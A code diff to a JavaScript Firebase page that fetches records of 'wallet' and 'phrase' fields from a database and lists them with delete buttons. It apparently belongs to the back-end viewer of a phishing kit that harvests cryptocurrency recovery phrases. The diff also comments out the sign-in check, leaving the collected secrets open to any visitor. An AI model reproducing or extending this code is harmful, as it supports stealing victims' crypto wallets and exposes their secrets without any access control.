@@ -5,23 +5,23 @@ import { cmBwsbFSqC as config} from 'https://giterhaber.github.io/web-codes/cmBw
 const app1 = firebase.initializeApp(ACCOUNT);
 const auth = firebase.auth(app1);
 
-auth.onAuthStateChanged((user) => {
-  if (user) {
-    // User is signed in, see docs for a list of available properties
-    // https://firebase.google.com/docs/reference/js/firebase.User
-    var uid = user.uid;
-    // ...
-    console.log('signed in')
-  } else {
-    // User is signed out
-    // ...
-    console.log('signed out')
-    location.href = './'
-  }
-});
-$('#logout').on('click', () => {
-  auth.signOut()
-})
+// auth.onAuthStateChanged((user) => {
+//   if (user) {
+//     // User is signed in, see docs for a list of available properties
+//     // https://firebase.google.com/docs/reference/js/firebase.User
+//     var uid = user.uid;
+//     // ...
+//     console.log('signed in')
+//   } else {
+//     // User is signed out
+//     // ...
+//     console.log('signed out')
+//     location.href = './'
+//   }
+// });
+// $('#logout').on('click', () => {
+//   auth.signOut()
+// })
 
 
 //DATABASE
@@ -61,16 +61,21 @@ function deleteTodo(event) {
 
 
 //get data
-db.collection("data").where('status', '!=', 'hide').get().then((querySnapshot) => {
+db.collection("data").get().then((querySnapshot) => {
   querySnapshot.forEach((doc) => {
     // doc.data() is never undefined for query doc snapshots
 
     // console.log(doc.id, " => ", doc.data());
 
 
-
     let wallet = doc.data().wallet
     let phrase = doc.data().phrase
+
+    if (doc.data().status == 'hide') {
+      //
+    } else {
+
+
 
     // console.log(`Wallet: ${wallet} <br> ${phrase}`)
 
@@ -91,6 +96,8 @@ db.collection("data").where('status', '!=', 'hide').get().then((querySnapshot) =
     delBtn.innerHTML = "🗑️"
     delBtn.addEventListener("click", deleteTodo)
     line.prepend(delBtn)
+
+    }
 
 
   });
